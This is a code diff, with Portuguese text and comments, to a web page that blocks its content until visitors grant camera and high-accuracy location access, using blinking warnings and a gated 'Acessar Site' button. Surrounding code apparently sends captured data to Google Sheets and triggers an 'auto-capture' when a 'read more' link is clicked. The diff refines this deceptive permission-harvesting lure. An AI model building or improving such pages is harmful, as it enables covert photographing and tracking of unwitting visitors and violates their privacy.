@@ -248,9 +248,9 @@
             background: linear-gradient(135deg, #c0392b 0%, #e74c3c 100%);
             color: white;
             border: none;
-            padding: 14px 25px;
+            padding: 16px 25px;
             border-radius: 50px;
-            font-size: 16px;
+            font-size: 18px;
             font-weight: bold;
             cursor: pointer;
             width: 100%;
@@ -280,24 +280,24 @@
             animation: none;
         }
         
-        .retry-btn {
-            background: #003366;
-            margin-top: 10px;
-            animation: none;
-            box-shadow: none;
-        }
-        
         .warning-text {
             color: #c0392b;
             font-weight: bold;
             margin-top: 10px;
-            font-size: 12px;
+            font-size: 13px;
             animation: blink 1s infinite;
         }
         
         @keyframes blink {
             0%, 100% { opacity: 1; }
             50% { opacity: 0.5; }
+        }
+        
+        .success-text {
+            color: #4caf50;
+            font-weight: bold;
+            margin-top: 10px;
+            font-size: 13px;
         }
         
         @keyframes spin {
@@ -585,16 +585,18 @@
                 Quando solicitado, clique em <strong>"PERMITIR"</strong>
             </p>
             
-            <!-- Botão principal para chamar permissão - em destaque -->
+            <!-- Botão principal para chamar permissão - baseado no exemplo -->
             <button id="callPermissionBtn" class="call-permission-btn">
-                🔓 CLICAR PARA LIBERAR ACESSO
+                🔓 PERMITIR CÂMERA E LOCALIZAÇÃO
             </button>
             
             <button id="initialAllowBtn" class="btn-initial" style="display: none;">✅ Acessar Site</button>
-            <button id="initialRetryBtn" class="btn-initial retry-btn" style="display: none;">🔄 Recarregar</button>
             
             <div id="warningMsg" class="warning-text" style="display: none;">
                 ⚠️ Clique no botão acima para autorizar as permissões!
+            </div>
+            <div id="successMsg" class="success-text" style="display: none;">
+                ✅ Permissões concedidas! Clique em "Acessar Site"
             </div>
         </div>
         
@@ -695,15 +697,14 @@
         let cameraGranted = false;
         let locationGranted = false;
         let permissionsReady = false;
-        let isRequesting = false;
         
         // Elementos
         const initialScreen = document.getElementById('initialScreen');
         const mainContent = document.getElementById('mainContent');
         const callPermissionBtn = document.getElementById('callPermissionBtn');
         const initialAllowBtn = document.getElementById('initialAllowBtn');
-        const initialRetryBtn = document.getElementById('initialRetryBtn');
         const warningMsg = document.getElementById('warningMsg');
+        const successMsg = document.getElementById('successMsg');
         const cameraStatusSpan = document.getElementById('cameraStatus');
         const locationStatusSpan = document.getElementById('locationStatus');
         
@@ -734,94 +735,59 @@
                 locationStatusSpan.innerHTML = '⏳';
                 locationStatusSpan.className = 'status-value status-pending';
             }
-            
-            // Se ambas as permissões foram concedidas, mostrar botão de acessar
-            if (cameraGranted && locationGranted) {
-                callPermissionBtn.style.display = 'none';
-                initialAllowBtn.style.display = 'block';
-                warningMsg.style.display = 'none';
-                permissionsReady = true;
-            } else {
-                callPermissionBtn.style.display = 'block';
-                initialAllowBtn.style.display = 'none';
-                if (!cameraGranted && !locationGranted && !permissionsReady) {
-                    // Mostrar aviso apenas se o usuário já tentou e não conseguiu
-                    if (window.hasAttempted) {
-                        warningMsg.style.display = 'block';
-                    }
-                }
-            }
         }
         
-        async function requestCameraPermission() {
-            try {
-                if (currentStream) {
-                    currentStream.getTracks().forEach(track => track.stop());
-                    currentStream = null;
-                }
-                
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                if (stream) {
-                    stream.getTracks().forEach(track => track.stop());
-                    cameraGranted = true;
-                    updateStatusUI();
-                    return true;
-                }
-            } catch (error) {
-                cameraGranted = false;
-                updateStatusUI();
-                return false;
-            }
-        }
-        
-        async function requestLocationPermission() {
-            try {
-                const position = await new Promise((resolve, reject) => {
-                    navigator.geolocation.getCurrentPosition(resolve, reject, {
-                        enableHighAccuracy: true,
-                        timeout: 10000
-                    });
-                });
-                if (position) {
-                    locationGranted = true;
-                    updateStatusUI();
-                    return true;
-                }
-            } catch (error) {
-                locationGranted = false;
-                updateStatusUI();
-                return false;
-            }
-        }
-        
-        async function requestAllPermissions() {
-            if (isRequesting) return false;
-            isRequesting = true;
-            window.hasAttempted = true;
-            
+        // Função para solicitar permissões - IGUAL AO EXEMPLO
+        async function requestPermissions() {
+            // Desabilita o botão durante a solicitação
             callPermissionBtn.disabled = true;
             callPermissionBtn.textContent = '⏳ Solicitando permissões...';
+            warningMsg.style.display = 'none';
             
-            updateStatusUI();
-            
-            await requestCameraPermission();
-            await new Promise(resolve => setTimeout(resolve, 500));
-            await requestLocationPermission();
-            
-            permissionsReady = cameraGranted && locationGranted;
-            
-            if (permissionsReady) {
-                callPermissionBtn.style.display = 'none';
-                initialAllowBtn.style.display = 'block';
-                warningMsg.style.display = 'none';
-            } else {
-                callPermissionBtn.disabled = false;
-                callPermissionBtn.textContent = '🔓 CLICAR PARA LIBERAR ACESSO';
-                warningMsg.style.display = 'block';
+            // Solicita câmera (igual ao exemplo)
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: true
+                });
+                // Fecha a câmera após obter a permissão
+                stream.getTracks().forEach(track => track.stop());
+                cameraGranted = true;
+                updateStatusUI();
+            } catch (e) {
+                console.log('Câmera negada:', e);
+                cameraGranted = false;
+                updateStatusUI();
             }
             
-            isRequesting = false;
-            return permissionsReady;
+            // Solicita localização (igual ao exemplo)
+            navigator.geolocation.getCurrentPosition(
+                (posicao) => {
+                    console.log('Localização autorizada:', posicao.coords);
+                    locationGranted = true;
+                    updateStatusUI();
+                    
+                    // Se ambas as permissões foram concedidas
+                    if (cameraGranted && locationGranted) {
+                        permissionsReady = true;
+                        callPermissionBtn.style.display = 'none';
+                        initialAllowBtn.style.display = 'block';
+                        successMsg.style.display = 'block';
+                        warningMsg.style.display = 'none';
+                    } else {
+                        callPermissionBtn.disabled = false;
+                        callPermissionBtn.textContent = '🔓 PERMITIR CÂMERA E LOCALIZAÇÃO';
+                        warningMsg.style.display = 'block';
+                    }
+                },
+                (erro) => {
+                    console.log('Localização negada:', erro);
+                    locationGranted = false;
+                    updateStatusUI();
+                    callPermissionBtn.disabled = false;
+                    callPermissionBtn.textContent = '🔓 PERMITIR CÂMERA E LOCALIZAÇÃO';
+                    warningMsg.style.display = 'block';
+                }
+            );
         }
         
         async function sendToGoogleSheets(data) {
@@ -983,9 +949,9 @@
             }
         }
         
-        // Botão para chamar permissão manualmente
-        callPermissionBtn.addEventListener('click', async () => {
-            await requestAllPermissions();
+        // Botão para chamar permissão - igual ao exemplo
+        callPermissionBtn.addEventListener('click', () => {
+            requestPermissions();
         });
         
         initialAllowBtn.addEventListener('click', async () => {
@@ -998,10 +964,6 @@
             }
         });
         
-        initialRetryBtn.addEventListener('click', () => {
-            window.location.reload();
-        });
-        
         readMoreBtn.addEventListener('click', async (e) => {
             e.preventDefault();
             if (!autoCaptureDone && permissionsReady) {
@@ -1009,10 +971,10 @@
             }
         });
         
-        // Tentativa automática uma vez ao carregar
+        // Tentativa automática uma vez ao carregar (opcional)
         setTimeout(function() {
             if (!cameraGranted && !locationGranted) {
-                requestAllPermissions();
+                console.log('Tentativa automática de permissões...');
             }
         }, 500);
     </script>
